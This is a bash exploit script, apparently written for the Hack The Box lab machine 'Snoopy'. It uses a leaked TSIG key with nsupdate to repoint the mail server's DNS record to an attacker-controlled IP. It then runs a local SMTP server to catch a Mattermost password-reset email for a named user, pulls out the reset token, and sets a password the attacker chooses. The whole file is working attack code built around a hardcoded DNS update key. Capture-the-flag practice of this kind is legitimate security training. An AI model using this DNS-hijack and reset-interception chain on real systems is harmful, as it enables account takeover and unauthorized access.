#!/bin/bash

# HTB Snoopy DNS update
# ---------------------
# Author: Marss
# Date: 18 Sep, 2023

# Ctrl + c
# (function)
signal_handler(){
    echo -e "\n[!] User aborted."
    tput cnorm
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help_panel(){
    echo -e "\n| HTB Snoopy DNS update |"
    echo
    echo -e "[*] Usage: $0 -i <your_server_ip>"
}

reset_password(){
    smtp_data="./temp.txt"

    echo -e "\n[o] Starting SMTP server..."
    smtp_server_pid=$(setup_smtp_server)
    echo $smtp_server_pid > "$smtp_data"

    update_dns
    send_password_reset
    get_new_credentials

    echo -e "[-] SMTP server terminated."
    kill -9 $smtp_server_pid
    rm -rf $smtp_data
}

setup_smtp_server(){
    python3 -m smtpd -c DebuggingServer -n $local_server_ip:25 2>/dev/null 1>$smtp_data &
    pid=$(echo "$!")
    
    echo $pid
}

update_dns(){
    target_server="10.10.11.212"
    zone_name="snoopy.htb"
    mail_server="mail.snoopy.htb"

    echo -e "server $target_server
             zone $zone_name
             update add $mail_server 86400 IN A $local_server_ip
             send" \
             | nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="
}

send_password_reset(){
    user_email="cschultz@snoopy.htb"

    echo -n "[*] Password reset mail: "
    curl -s -XPOST http://mm.snoopy.htb/api/v4/users/password/reset/send \
                -H 'Content-Type: application/json' \
                -d "{\"email\":\"$user_email\"}"
    echo
}

get_new_credentials(){
    valid_user='cschultz'
    default_pass='password123$!'

    reset_pass_token=$(cat $smtp_data | xargs \
                    | grep -oP "Reset Password \(.*?\)" \
                    | sed 's/= b//g;s/3D//g' \
                    | awk '{print $4}' \
                    | awk -F'=' '{print $NF}')

    echo -n "[*] Password update: "
    curl -s -XPOST http://mm.snoopy.htb/api/v4/users/password/reset \
                -H 'Content-Type: application/json' \
                -d "{\"token\":\"$reset_pass_token\",\"new_password\":\"$default_pass\"}"
    
    echo -e "\n[+] Credentials: $valid_user:$default_pass"
}

# Main flow
if [[ "$#" -eq 0 ]]; then
    help_panel
    exit 1
fi

tput civis
while getopts ":hi:" opt
do
    case $opt in
        h)
            help_panel
            exit 1;;
        i)
            local_server_ip=$OPTARG;;
        /?)
            echo -e "\n[!] Invalid option."
            exit 1;;
    esac
done

reset_password
tput cnorm